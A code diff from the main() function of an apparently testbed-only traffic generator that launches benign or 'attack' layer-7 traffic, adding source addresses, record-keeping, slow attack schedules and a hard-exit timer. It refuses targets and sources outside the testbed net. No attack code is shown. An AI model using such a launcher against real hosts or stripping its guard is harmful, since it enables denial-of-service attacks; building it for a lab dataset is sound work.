     args = ap.parse_args(argv)
 
     name = args.kind if args.role == "benign" else args.family
@@ -440,17 +819,42 @@ def main(argv=None):
     fn = resolve(args.role, name)
     plan = {"role": args.role, "name": name, "host": args.host, "port": args.port,
             "duration": args.duration, "seed": args.seed, "params": params}
+    if args.source is not None:
+        plan["source"] = args.source
+    if args.records is not None:
+        if args.role != "benign" or name not in l7_benign.KINDS + l7_benign.L7V2_KINDS:
+            raise SystemExit(f"[-] --records is for the benign plan kinds, not {args.role} {name}")
+        plan["records"] = args.records
     if args.plan:
+        if args.role == "attack" and paced(name, params):
+            plan["schedule"] = slow_schedule(name, args.host, params, args.duration, random.Random(args.seed))
         print(json.dumps(plan))
         return 0
-    try:
-        if ipaddress.ip_address(args.host) not in TESTBED_NET:
-            raise SystemExit(f"[-] refusing: {args.host} is outside the testbed net {TESTBED_NET}")
-    except ValueError:
-        raise SystemExit(f"[-] refusing: {args.host} is not a testbed IP") from None
+    for what, addr in (("target", args.host), ("source", args.source)):
+        if addr is None:
+            continue
+        try:
+            if ipaddress.ip_address(addr) not in TESTBED_NET:
+                raise SystemExit(f"[-] refusing: {what} {addr} is outside the testbed net {TESTBED_NET}")
+        except ValueError:
+            raise SystemExit(f"[-] refusing: {what} {addr} is not a testbed IP") from None
+    global SOURCE, RECORDER
+    SOURCE = args.source
     if args.port == 443:
         os.environ.setdefault("PYTHONWARNINGS", "ignore")      # self-signed cert
-    fn(args.host, args.port, params, args.duration, random.Random(args.seed))
+    if args.records is not None:
+        RECORDER = Recorder(args.records)
+    bound = threading.Timer(args.duration + HARD_EXIT_S, _hard_exit, args=(args.stats,))
+    bound.daemon = True
+    bound.start()
+    try:
+        stats = fn(args.host, args.port, params, args.duration, random.Random(args.seed))
+    finally:
+        if RECORDER is not None:
+            RECORDER.close()
+    if args.stats:
+        with open(args.stats, "w", encoding="utf-8") as fh:
+            json.dump(stats or {}, fh)
     return 0
 
 
